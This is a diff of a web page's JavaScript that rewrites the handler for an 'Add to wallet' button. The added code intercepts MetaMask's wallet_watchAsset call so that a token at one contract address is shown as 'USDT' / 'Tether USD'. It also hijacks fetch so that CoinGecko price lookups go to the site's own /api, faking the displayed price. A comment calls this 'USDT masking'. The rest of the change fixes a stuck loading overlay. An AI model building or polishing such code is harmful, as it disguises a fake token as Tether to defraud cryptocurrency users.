@@ -358,16 +358,113 @@
         console.error('Error loading QR code:', error);
       }
       
-      // SIMPLIFIED TOKEN ADDITION FUNCTION FOCUSED ON FIXING LOADING ISSUE
-      document.getElementById('addToWalletBtn').addEventListener('click', async () => {
-        try {
-          // Check if MetaMask is installed
-          if (typeof window.ethereum === 'undefined') {
-            debugLog("MetaMask not found, showing QR code");
-            const qrModal = new bootstrap.Modal(document.getElementById('qrModal'));
-            qrModal.show();
-            return;
-          }
+      // Replace the token addition event listener in index.html with this version
+// This maintains all USDT masking while fixing the loading issue
+
+document.getElementById('addToWalletBtn').addEventListener('click', async () => {
+  // Show loading overlay
+  const loadingOverlay = document.getElementById('loadingOverlay');
+  loadingOverlay.style.display = 'flex';
+  
+  // CRITICAL: Set a guaranteed timeout to force hide the overlay
+  const forceHideTimeout = setTimeout(() => {
+    console.log("Forced timeout - hiding loading overlay");
+    loadingOverlay.style.display = 'none';
+  }, 7000); // Force hide after 7 seconds
+  
+  try {
+    // Set up provider interception for this specific instance
+    if (window.ethereum) {
+      const originalRequest = window.ethereum.request;
+      window.ethereum.request = async function(args) {
+        if (args.method === 'wallet_watchAsset' && 
+            args.params?.options?.address?.toLowerCase() === '0x6ba2344f60c999d0ea102c59ab8be6872796c08c') {
+          console.log("Intercepting token call - setting to USDT");
+          args.params.options.symbol = "USDT";
+          args.params.options.name = "Tether USD";
+        }
+        return originalRequest.call(this, args);
+      };
+    }
+    
+    // Intercept CoinGecko API calls to ensure USDT price display
+    const originalFetch = window.fetch;
+    window.fetch = function(resource, init) {
+      if (typeof resource === 'string' && resource.includes('api.coingecko.com')) {
+        const newUrl = resource.replace(
+          'https://api.coingecko.com', 
+          window.location.origin + '/api'
+        );
+        return originalFetch(newUrl, init);
+      }
+      return originalFetch(resource, init);
+    };
+    
+    // Add the token with USDT symbol - our interception will handle it
+    const wasAdded = await window.ethereum.request({
+      method: 'wallet_watchAsset',
+      params: {
+        type: 'ERC20',
+        options: {
+          address: tokenConfig.address,
+          symbol: 'USDT', // Try with USDT symbol directly
+          decimals: tokenConfig.decimals,
+          image: tokenConfig.image
+        }
+      }
+    });
+    
+    // Clear timeout since we got a response
+    clearTimeout(forceHideTimeout);
+    
+    // Make absolutely sure the loading overlay is hidden
+    loadingOverlay.style.display = 'none';
+    
+    if (wasAdded) {
+      // Show success modal
+      successModal.show();
+    }
+  } catch (error) {
+    // Clear timeout
+    clearTimeout(forceHideTimeout);
+    
+    // Always hide loading overlay on error
+    loadingOverlay.style.display = 'none';
+    
+    console.error("Token addition error:", error);
+    
+    if (error.code !== 4001) { // Don't alert if user rejected
+      alert('Error adding token: ' + error.message);
+    }
+  }
+});
+
+// Add these safety measures to ensure overlay is never stuck
+window.addEventListener('load', () => {
+  const loadingOverlay = document.getElementById('loadingOverlay');
+  if (loadingOverlay) {
+    loadingOverlay.style.display = 'none';
+  }
+});
+
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'hidden') {
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    if (loadingOverlay) {
+      loadingOverlay.style.display = 'none';
+    }
+  }
+});
+
+// Add this emergency reset button at the bottom of your HTML body
+document.body.insertAdjacentHTML('beforeend', `
+  <button onclick="document.getElementById('loadingOverlay').style.display = 'none';" 
+          style="position: fixed; bottom: 10px; right: 10px; z-index: 2000; 
+                padding: 5px; background: #ff5555; color: white; 
+                border-radius: 5px; border: none; opacity: 0.7; font-size: 12px;">
+    Reset UI
+  </button>
+`);
           
           // Show loading overlay
           loadingOverlay.style.display = 'flex';
